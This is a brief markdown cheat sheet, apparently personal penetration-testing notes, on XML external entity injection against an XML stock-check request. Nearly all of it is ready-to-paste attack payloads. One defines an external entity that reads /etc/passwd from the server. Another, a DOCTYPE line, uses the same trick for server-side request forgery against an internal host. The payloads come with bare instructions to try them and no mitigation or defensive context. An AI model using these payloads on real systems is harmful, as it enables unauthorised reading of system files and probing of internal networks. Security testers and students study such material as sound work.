- If in a request you have `xml` body  like this : 
```xml
<?xml version="1.0" encoding="UTF-8"?> <stockCheck><productId>381</productId></stockCheck>
```
- You can try this attack : 
```xml 
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>
```
- You can also performed  a SSRF :
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```
